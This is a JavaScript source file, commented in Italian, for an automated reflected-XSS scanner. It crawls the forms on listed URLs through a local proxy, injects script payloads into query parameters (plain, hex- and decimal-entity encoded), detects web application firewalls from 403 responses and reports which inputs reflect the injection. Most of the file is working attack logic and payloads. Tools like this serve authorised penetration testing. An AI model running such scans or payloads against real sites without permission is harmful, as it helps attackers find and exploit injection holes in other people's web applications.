/* XHR */


var xhr;                   /* istanza dell'oggetto xhr */

try
{
   xhr = new XMLHttpRequest();            /* prova ad istanziare la variabile con un'XHR normale */
}
catch(error)
{
   try
   {
      xhr = new ActiveXObject("Microsoft.XMLHTTP");         /* prova ad istanziare la variabile con l'XHR di IE */
   }
   catch(error)
   {
      console.log("errore: oggetto XHR non disponibile...");
   }
}
 
var parser = new DOMParser();               /* istanza dell'oggetto DOMparser */

var i, j;                    /* indici dei cicli interni alle funzioni */
var k;                       /* indice del ciclo riguardante la lista di url */
var l;                       /* indice del ciclo riguardante i form del documento in analisi */
var n;                       /* indice del ciclo più interno durante la scansione avanzata */

/***************************************************************************************************
*  oggetto per tenere in memoria il codice sorgente del documento, le iniezioni ed altre variabili *
***************************************************************************************************/

var doc =
{
    data_source : "",                                                                                                 /* codice sorgente delle pagine */
    is_in_javascript : false,                                                                                         /* variabile booleana per vedere se l'iniezione è finita nel js */
    injection_1 : "\"'<>()[]{}\\;___INJECTION___",                                                                    /* prima iniezione per vedere se l'applicazione filtra i caratteri inseriti */
    injection_2 : '%22%3E%3Cscript%20name%3D%22inject%22%3Ealert(%22xss%22)%3B%3C%2Fscript%3E%3Cxss',                 /* seconda iniezione per provare i vari tentativi */
    injection_post : '%22%3E%3Cscript%20name%3D%22inject%22%3E%3C%2Fscript%3E',                                       /* iniezione non pericolosa per i metodi post (script vuoto)*/
    
                                                                                                                     // iniezione codificata in esadecimale equivalente a: &#x22;&#x3e;&#x3c;script&#x3e;alert(&#x27;xss&#x27;);&#x3c;&#x2f;script&#x3e;
    injection_hex : ['%26%23x22%3B%26%23x3e%3B%26%23x3c%3Bscript%26%23x3e%3Balert(%26%23x27%3Bxss%26%23x27%3B)%3B%26%23x3c%3B%26%23x2f%3Bscript%26%23x3e%3B', '%26%23x022%3B%26%23x03e%3B%26%23x03c%3Bscript%26%23x03e%3Balert(%26%23x027%3Bxss%26%23x027%3B)%3B%26%23x03c%3B%26%23x02f%3Bscript%26%23x03e%3B', '%26%23x0022%3B%26%23x003e%3B%26%23x003c%3Bscript%26%23x003e%3Balert(%26%23x0027%3Bxss%26%23x0027%3B)%3B%26%23x003c%3B%26%23x002f%3Bscript%26%23x003e%3B', '%26%23x00022%3B%26%23x0003e%3B%26%23x0003c%3Bscript%26%23x0003e%3Balert(%26%23x00027%3Bxss%26%23x00027%3B)%3B%26%23x0003c%3B%26%23x0002f%3Bscript%26%23x0003e%3B', '%26%23x000022%3B%26%23x00003e%3B%26%23x00003c%3Bscript%26%23x00003e%3Balert(%26%23x000027%3Bxss%26%23x000027%3B)%3B%26%23x00003c%3B%26%23x00002f%3Bscript%26%23x00003e%3B', '%26%23x0000022%3B%26%23x000003e%3B%26%23x000003c%3Bscript%26%23x000003e%3Balert(%26%23x0000027%3Bxss%26%23x0000027%3B)%3B%26%23x000003c%3B%26%23x000002f%3Bscript%26%23x000003e%3B'],
                                                                                                                     // iniezione codificata in decimale equivalente a: &#34;&#62;&#60;script&#62;alert&#40;&#39;xss&#39;&#41;&#59;&#60;&#47;script&#62;
    injection_dec : ['%26%2334%3B%26%2362%3B%26%2360%3Bscript%26%2362%3Balert%26%2340%3B%26%2339%3Bxss%26%2339%3B%26%2341%3B%26%2359%3B%26%2360%3B%26%2347%3Bscript%26%2362%3B', '%26%23034%3B%26%23062%3B%26%23060%3Bscript%26%23062%3Balert%26%23040%3B%26%23039%3Bxss%26%23039%3B%26%23041%3B%26%23059%3B%26%23060%3B%26%23047%3Bscript%26%23062%3B', '%26%230034%3B%26%230062%3B%26%230060%3Bscript%26%230062%3Balert%26%230040%3B%26%230039%3Bxss%26%230039%3B%26%230041%3B%26%230059%3B%26%230060%3B%26%230047%3Bscript%26%230062%3B', '%26%2300034%3B%26%2300062%3B%26%2300060%3Bscript%26%2300062%3Balert%26%2300040%3B%26%2300039%3Bxss%26%2300039%3B%26%2300041%3B%26%2300059%3B%26%2300060%3B%26%2300047%3Bscript%26%2300062%3B'],
    
    _url : "",                                                                                                        /* url richiesto da analizzare */
    _url_copy : '',                                                                                                   /* copia di url utile al ripristino dello stesso */
    malevolous_url : "",                                                                                              /* url malevolo contenente una possibile iniezione */
    
    post_header : {                                                              /* oggetto per memorizzare i parametri dell'header HTTP delle chiamate POST */
               host : "",
               referer : "",
               path : "",
               malevolous_body : ""
           },
    
    
    vaerifyInjection : function()            // funzione per verificare se l'iniezione ha avuto successo
    {
        var inject = this.data_source.getElementsByName('inject');         /* prendi le iniezioni nel testo */
        if(inject.length > 0)                                              /* se ci sono iniezioni */
        {
            report.reflected_get = true;                                   /* aggiorna il report */
            make_report(k, report.vuln_input);                             /* aggiorna la pagina ed il CSS relativo */
        }
        console.log("l'iniezione è stata riflessa " + inject.length + " volte");
    },
    
    clear_post_header : function()          // funzione per ripristinare a valore iniziale l'oggetto che tiene gli header HTTP delle chiamate POST
    {
      this.post_header.host = '';
      this.post_header.referer = '';
      this.post_header.path = '';
      this.post_header.malevolous_body = '';
    }
};

/*********************************************************************************************
*  oggetto per tenere traccia dei form del documento con i relativi metodi , action ed input *
*********************************************************************************************/

var form_obj =
{
    valid : false,
    form : [],                             /* array per contenere i form del documento */
    form_method : [],                      /* array per memorizzare i metodi dei form */
    form_action : [],                      /* array per memorizzare gli action dei form */
    valid_form : [],                       /* array di valori booleani per tenere informazione su quali form siano attaccabili */
    input : [],                            /* array di array di campi input all'interno dei form */
    
    getInput : function(data_source)               // funzione per recuperare dal sorgente tutte le informazioni possibili sui form
    {
        this.form = data_source.getElementsByTagName('FORM');                   /* prende e memorizza tutti i form del documento in analisi */
        console.log("numero di form nella pagina: " + this.form.length);
        
        for(i = 0; i < this.form.length; i++)                                   /* per ogni form del documento */
        {
            this.form_action[i] = this.form[i].getAttribute('action');          /* prendi le loro action e memorizzale */
            this.form_method[i] = this.form[i].getAttribute('method');          /* prendi i loro metodi e memorizzali */
            
            if(this.form_method[i] == null )                                     /* se il form non possiede un valore del metodo */
            {
               this.form_method[i] = 'GET';                                     /* allora è di default GET */
            }
            this.input[i] = this.form[i].getElementsByTagName('INPUT');         /* prendi tutti gli input e memorizzali */
        }
    },
    
    getInputText : function()                      // funzione per attribuire quali form siano validi per un tentativo di attacco e la memorizzazione dei relativi name degli input
    {
        for(i = 0; i < this.form.length; i++)                      /* per ogni input di ogni form vedi se è 'text', 'search' o senza type (quindi 'text', ovvero default) */
        {                                                          /* se lo è incrementa il contatore di input_text */
            for(j = 0; j < this.input[i].length; j++)              /* e salva il loro NAME per una futura iniezione */
            {
                if((!this.input[i][j].getAttribute('type') || this.input[i][j].getAttribute('type') == 'search' || this.input[i][j].getAttribute('type') == 'text') && this.input[i][j].getAttribute('name') && this.form_action[i])
                {
                    this.valid = true;
                    this.valid_form[i] = true;
                }
            }
            if(!this.valid_form[i])
            {
               this.valid_form[i] = false;
            }
        }
    },
    
    clear_form : function()         // funzione per il ripristino dei valori dell'oggetto form per un suo futuro riutilizzo
    {
      this.valid = false;
      this.form = [];                             
      this.form_method = [];                      
      this.form_action = [];
      this.valid_form = [];
      this.input = [];                            
      this.input_text_name = [];                  
      this.index_text = [];                       
      this.n_text = 0;
    }
};

/***********************************************************
*  oggetto report che tiene traccia dei risultati ottenuti *
***********************************************************/

var report =
{
    vuln_input : "",            /* stringa per contenere il nome degli input vulnerabili */
    waf : false,                /* variabile booleana per asserire la presenza di un web application firewall */
    reflected_get : false,      /* variabile booleana per asserire una vulnerabilità xss reflected con metodo get */
    reflected_post : false,     /* variabile booleana per asserire una vulnerabilità xss reflected con metodo post (self-xss oppure stored xss)*/
    no_form : false,            /* variabile booleana per asserire la mancanza di form nella pagina in esame */
    
    no_filter_dq : false,       /* variabile booleana per asserire un mancato filtraggio del carattere " */
    no_filter_q : false,        /* variabile booleana per asserire un mancato filtraggio del carattere ' */
    no_filter_la : false,       /* variabile booleana per asserire un mancato filtraggio del carattere < */
    no_filter_ra : false,       /* variabile booleana per asserire un mancato filtraggio del carattere > */
    no_filter_lr : false,       /* variabile booleana per asserire un mancato filtraggio del carattere ( */
    no_filter_rr : false,       /* variabile booleana per asserire un mancato filtraggio del carattere ) */                                  // oggetto da utilizzare in un futuro aggiornametno del programma
    no_filter_ls : false,       /* variabile booleana per asserire un mancato filtraggio del carattere [ */
    no_filter_rs : false,       /* variabile booleana per asserire un mancato filtraggio del carattere ] */
    no_filter_lc : false,       /* variabile booleana per asserire un mancato filtraggio del carattere { */
    no_filter_rc : false,       /* variabile booleana per asserire un mancato filtraggio del carattere } */
    no_filter_bs : false,       /* variabile booleana per asserire un mancato filtraggio del carattere \ */
    no_filter_s : false,         /* variabile booleana per asserire un mancato filtraggio del carattere ; */
    
    clear_report : function()          // funzione per ripristinare i valori del report come ad inizio elaborazione
    {
      this.vuln_input = [];
      this.waf = false;
      this.reflected_get = false;
      this.reflected_post = false;
      this.no_form = false;
      this.no_filter_dq = false;
      this.no_filter_q = false;
      this.no_filter_la = false;
      this.no_filter_ra = false;
      this.no_filter_lr = false;
      this.no_filter_rr = false;
      this.no_filter_ls = false;
      this.no_filter_rs = false;
      this.no_filter_lc = false;
      this.no_filter_rc = false;
      this.no_filter_bs = false;
      this.no_filter_s = false;
    }
};


/********************************************************************************
*  funzione principale per gestire l'invio dei dati(url) e la loro elaborazione *
********************************************************************************/

function send_address()
{
   make_list();                                                                           /* crea un'array di url da controllare */
   
   if(document.getElementById('type').value == 'simple')       // SCANSIONE SEMPLICE
   {
      for(k = 0; k < list_array.length; k++)                                              /* per tutti gli url da analizzare */
      {
         doc._url = list_array[k];                                                        /* recupera l'url dall'input */
         doc._url_copy = doc._url = doc._url.substr(0, doc._url.length - 1);              /* leva il carattere '\n' ed copia il valore nelle due variabili */
         get_homepage();                                                                  /* richiede il documento associato all'url */
        
        doc.data_source = parser.parseFromString(xhr.responseText, "text/html");          /* parsa la stringa di risposta e ritorna un oggetto del DOM */
        form_obj.getInput(doc.data_source);                                               /* recupera dalla pagina tutti i dati relativi ad input e form */
        form_obj.getInputText();                                                          /* verifica quali form siano validi per un'attacco */
        
        if(form_obj.valid)                                                                /* se nella pagina ci sono costrutti attaccabili */
        {
            for(l = 0; l < form_obj.form.length; l++)                                     /* per tutti i form del documento */
            {
               if(form_obj.valid_form[l] && form_obj.form_method[l] != 'post')            /* se è possibile iniettare del codice */
               {
                  form_obj.form_action[l] = verify_action_dir(form_obj.form_action[l]);   /* recupera l'action del form */
                  send_injection_get();                                                   /* tenta un'iniezione */
                  doc._url = doc._url_copy;                                               /* ripristina il valore iniziale dell'url per poterlo riutilizzare */
               }
               /*else
               {
                  if(form_obj.valid_form[l] && form_obj.form_method[l] == 'post')
                  {
                     send_injection_post();
                     doc._url = doc._url_copy;                               ///////////////   POST_INJECTION_PART   //////////////////// RIMUOVERE IL COMMENTO PER AGGIUNGERE L'ANALISI DEI FORM CON METODO POST (slef-XSS o stored-XSS)...
                     doc.clear_post_header();
                  }
               }*/
            }
        }
        else
        {
            console.log('non ci sono costrutti attaccabili...');
            report.no_form = true;                                      /* aggiorna il report per asserire l'assenza di costrutti attaccabili */
        }
       
       report.clear_report();                                           /* ripristino dei valori degli oggetti form e report per un futuro riutilizzo */
       form_obj.clear_form();
      }
   }
   else        // SCANSIONE AVANZATA
   {
       
      for(k = 0; k < list_array.length; k++)                                              /* per tutti gli url da analizzare */
      {
         
         doc._url = list_array[k];                                                        /* recupera l'url dall'input */
        
         doc._url_copy = doc._url = doc._url.substr(0, doc._url.length - 1);              /* leva il carattere '\n' ed copia il valore nelle due variabili */
         get_homepage();                                                                  /* richiede il documento associato all'url */
        
        doc.data_source = parser.parseFromString(xhr.responseText, "text/html");          /* parsa la stringa di risposta e ritorna un oggetto del DOM */
        form_obj.getInput(doc.data_source);                                               /* recupera dalla pagina tutti i dati relativi ad input e form */
        form_obj.getInputText();                                                          /* verifica quali form siano validi per un'attacco */
        
         
         if(form_obj.valid)                                                               /* se nella pagina ci sono costrutti attaccabili */
         {
            for(l = 0; l < form_obj.form.length; l++)                                     /* per tutti i form del documento */
            {
               make_adv_url(form_obj.input[l]);                                           /* prova ad iniettare codice in tutti i parametri della query(anche quelli hidden) */
            }
            
            for(l = 0; l < form_obj.form.length; l++)                                     /* per tutti i form del documento */
            {
               encoded_injection(form_obj.input[l]);                                      /* prova ad iniettare del codice con codifica decimale(&#YYYYY;) ed esadecimale(&#xYYYYY;) */
            }
            
           
         }
         else
         {
             console.log('non ci sono costrutti attaccabili...');
             report.no_form = true;                                                        /* aggiorna il report per asserire l'assenza di costrutti attaccabili */
         }
      
       report.clear_report();                                                             /* ripristino dei valori degli oggetti form e report per un futuro riutilizzo */
       form_obj.clear_form();
      }
   }
}

/***************************************************************************************
*  funzione per i tentativi di iniezione codificata decimale ed esadecimale durante    *
*  la scansione avanzata.                                                              *
***************************************************************************************/

function encoded_injection(input)
{
   var i;                                                                        /* indice dei cicli */
   
   if(form_obj.valid_form[l] && form_obj.form_method[l] != 'post')               /* se è possibile iniettare del codice */
   {
      form_obj.form_action[l] = verify_action_dir(form_obj.form_action[l]);      /* recupera l'action del form */
      doc.malevolous_url = doc._url + form_obj.form_action[l] + "?";             /* costruisce la prima parte dell'url malevolo */
      
      for(i = 0; i < doc.injection_hex.length; i++)                              /* per tutte le codifiche del payload */
      {
         make_malevolous_url(input, doc.injection_hex[i]);
         send_injection_get();   
      }
   
      for(i = 0; i < doc.injection_dec.length; i++)
      {
         make_malevolous_url(input, doc.injection_dec[i]);
         send_injection_get();
      }
   }
}

/***************************************************************************************
*  funzione per la scansione avanzata dei form con i relativi tentativi di iniezinoe   *
*  nei value di tutti i parametri della querystring (anche gli hidden).                *
***************************************************************************************/

function make_adv_url(input)
{
      if(form_obj.valid_form[l] && form_obj.form_method[l] != 'post')            /* se è possibile iniettare del codice */
      {
         form_obj.form_action[l] = verify_action_dir(form_obj.form_action[l]);      /* recupera l'action del form */
         doc.malevolous_url = doc._url + form_obj.form_action[l] + "?";             /* costruisce la prima parte dell'url malevolo */
         
         var sent_var = 0;                                                          /* variabile per tenere conto del numero di parametri nella querystring */
         
         for(i = 0; i < input.length; i++)                                          /* per tutti gli input del form che si sta analizzando */
         {
            if(is_sent(input[i]))                                                   /* se l'input in questione andrà a finire nella querystring */
            {
               sent_var++;                                                          /* aumenta il contatore dei parametri */
            }
         }
         
         for(n = 0; n < sent_var; n++)                                                 /* per ogni input che va a finire nella querystring */
         {
            doc.malevolous_url = doc._url + form_obj.form_action[l] + "?";             /* costruisce la prima parte dell'url malevolo */
            
            for(i = 0; i < input.length; i++)                                                                                 /* per tutti gli input del form che si sta analizzando */
            {
               if(is_sent(input[i]))                                                                                          /* se l'input in questione andrà a finire nella querystring */
               {
                  if(i == n)                                                                                                  /* e se è il suo turno */
                  {
                      doc.malevolous_url += (input[i].getAttribute('name') + "=" + doc.injection_2 + '&');                    /* attribuiscigli un valore con semantica di script */
                      report.vuln_input = input[i].getAttribute('name');
                  }
                  else
                  {
                     doc.malevolous_url += (input[i].getAttribute('name') + '=' + input[i].getAttribute('value') + '&');      /* attribuiscigli il valore che possiede */
                  }
               }
            }
            
            doc.malevolous_url = doc.malevolous_url.substr(0, (doc.malevolous_url.length - 1));                   /* rimuovi dall'url malevolo l'ultima "&" */            
            doc.malevolous_url = doc.malevolous_url.replace(/&/g, '%26');                                         /* rimpiazza tutte le "&" con la loro codifica url per evitare che nel corpo della post verso il proxy ci siano problemi */
            doc.malevolous_url = doc.malevolous_url.replace(/ /g, '+');                                           /* rimpiazza tutti gli spazi con un "+"(urlencoded) */
            send_injection_get();
         }
      }
}

/*************************************************************************************
*  funzione per iniettare del codice che andrà a finire nel javascript della pagina  *                // per un futuro utilizzo nella ricerca di iniezioni nel javascript tipo JSON-XSS
*************************************************************************************/

function js_injection()
{
   
}

/**********************************************************
*  funzione per recuperare il documento associato all'url *
**********************************************************/

function get_homepage()
{
    xhr.open('POST', 'http://localhost:8083', false);                               /* apre(istanzia) una chiamata post verso il proxy-server */
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");      /* setta il parametro content-type nell'header HTTP */
    xhr.send("url=" + doc._url);                                                    /* invia la richiesta(asincrona) con nei parametri del body l'url malevolo da cercare */
    console.log('request sent for the url: ' + doc._url);
}

/*********************************************************************
*  funzione per la lettura dell'action dei form e la messa a punto   *
*  del link malevolo o della chiamata post malevola.                 *
*********************************************************************/

function verify_action_dir(action)
{
   if(/[\/]$/.test(doc._url))                                        /* se l'url finisce con un carattere '/' , rimuove l'ultimo carattere */
   {
      doc._url = doc._url.replace(/[\/]$/, '');
   }
   
   if(/^(\.\/)/.test(action))                                        // se l'action inizia per "./" levagli il punto
   {
      action = action.substr(1);
   }
   
   var count = (action.match(/\.\.\//g) || []).length;               /* memorizza il numero di sequenze '../' nell'action (se esistono) */
   
   if(count > 0)                                                     /* se il numero di sequenze "../" è maggiore di zero */
   {
      action = action.replace(/\.\.\//g, '');                        /* rimuovi tutte le sequenze  '../' */
         
      for(i = 0; i < count; i++)                                     /* per il numero di sequenze precedentemente rimosse torna indietro di una posizione nell'url */
      {
         doc._url = doc._url.replace(/(\/[^\/]+)$/, "");             /* scala di una posizione indietro nell'url */
      }
      doc._url = doc._url.replace(/([^\/]+)$/, "");                  /* rimuovi il nome dell'attuale dir dell'url  */
   }
   else
   {
      if(/^(\/\/)/.test(action))                                     // se l'action inizia per "//" aggiornalo a stringa vuota                         
      {
         doc._url = action.replace(/^(\/\/)/, '');
         action = '';
      }
      else
      {
         if(/#/.test(action))                                  // se l'action contiene il fragment identifier aggiusta le dir
         {
            var index = action.indexOf('#');
            action = action.substr(0, index);
            
            if(/^[\/]/.test(action))
            {
               action = '/' + (action);
            }
         
            doc._url = doc._url.replace(/([^\/]+)$/, "");          /* rimuovi il nome dell'attuale dir dell'url  */
         }
         else
         {
            if(/^((ftp:\/\/|http:\/\/|https:\/\/|www\.){1})/.test(action))                      // se l'action è un'indirizzo intero azzera l'url
            {
               doc._url = "";
            }
            else
            {
               if(/^[^\/]/.test(action))                                                        // se l'action non inizia per '/' allora è nella dir successiva a quella corrente nell'url
               {
                  action = '/' + action;                                                        /* aggiungi '/' all'inizio dell'action */
               }
               else
               {
                  if(/(\/[^\/]+){1,30}/.test(action) || /(\/[^\/]+[\/]{1})/.test(action))        // se l'action è composto da 2 o più sequenze '/.....' oppure una sequenza '/.../'
                  {
                     var first_dir = action.match(/\/[^\/]+/g)[0];                              /* prendi la prima dir nell'action e memorizza il suo indice all'interno dell'url */
                     var _index = doc._url.indexOf(first_dir);
                     
                     if(_index != -1)                                                           /* se compare nell'url */
                     {
                        doc._url = doc._url.substring(0, _index);
                     }
                  }
               }
            }
         }
      }
   }
   return action;
}

/*************************************************************************
*  funzione per vedere se un input adrà a finire nella querystring       *
*************************************************************************/

function is_sent(input)
{
    if(!input.getAttribute('type') || input.getAttribute('type') == 'text' || input.getAttribute('type') == 'search' || input.getAttribute('type') == 'hidden')
    {
       return true;
    }
    return false;
}

/*************************************************************************
*  funzione per vedere se un input sarà iniettabliie                     *
*************************************************************************/

function is_injectable(input)
{
   if(!input.getAttribute('type') || input.getAttribute('type') == 'text' || input.getAttribute('type') == 'search')
   {
       return true;
   }
   return false;
}


/**************************************************************************
*  funzione per creare l'url malevolo sulla base dei dati a disposizione  *
**************************************************************************/

function make_malevolous_url(input, injection)
{
   doc.malevolous_url = doc._url + form_obj.form_action[l] + "?";                                                    /* costruisce la prima parte dell'url malevolo */
   console.log(doc._url + '     ' + form_obj.form_action[l]);
   
   for(i = 0; i < input.length; i++)                                                                                 /* per tutti gli input del form che si sta analizzando */
   {
      if(is_sent(input[i]))                                                                                          /* se l'input in questione andrà a finire nella querystring */
      {
         if(is_injectable(input[i]))                                                                                 /* se l'input è iniettabile */
         {
             doc.malevolous_url += (input[i].getAttribute('name') + "=" + injection + '&');                          /* attribuiscigli un valore con semantica di script */
             report.vuln_input = input[i].getAttribute('name');
         }
         else
         {
            doc.malevolous_url += (input[i].getAttribute('name') + '=' + input[i].getAttribute('value') + '&');      /* attribuiscigli il valore che possiede */
         }
      }
   }
   
   doc.malevolous_url = doc.malevolous_url.substr(0, (doc.malevolous_url.length - 1));                   /* rimuovi dall'url malevolo l'ultima "&" */            
   doc.malevolous_url = doc.malevolous_url.replace(/&/g, '%26');                                         /* rimpiazza tutte le "&" con la loro codifica url per evitare che nel corpo della post verso il proxy ci siano problemi */
   doc.malevolous_url = doc.malevolous_url.replace(/ /g, '+');                                           /* rimpiazza tutti gli spazi con un "+"(urlencoded) */
}

/*****************************************************************************************
*  funzione per richiedere la pagina a seguito di una possibile iniezione con metodo get *
*****************************************************************************************/

function send_injection_get()
{
   if(document.getElementById('type').value == 'simple')
    {make_malevolous_url(form_obj.input[l], doc.injection_2);}                   /* costruisce l'url malevolo per il form in analisi */
    xhr.open('POST', 'http://localhost:8083/injection_get', false);              /* istanzia la chiamata al proxy */
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");   /* setta l'header content-type della chiamata post al proxy */
    xhr.send("url=" + doc.malevolous_url);                                       /* invia la richiesta al proxy con nel body l'url malevolo */
    console.log('injection_url_request_sent: ' + doc.malevolous_url);
    
    if(xhr.status === 403)                                                       /* se il codice HTTP di risposta è 403(access denied) */
    {
      console.log("richiesta bloccata da un web application firewall...");       /* aggiorna il report di analisi */
      report.waf = true;
    }
    else
    {
      doc.data_source = parser.parseFromString(xhr.responseText, "text/html");   /* recupera la risposta(parsandola ad oggetto DOM) */
      console.log("injection_data_retrived");
      doc.vaerifyInjection();                                                    /* verifica se ci sono iniezioni che hanno avuto successo */
    }          
}
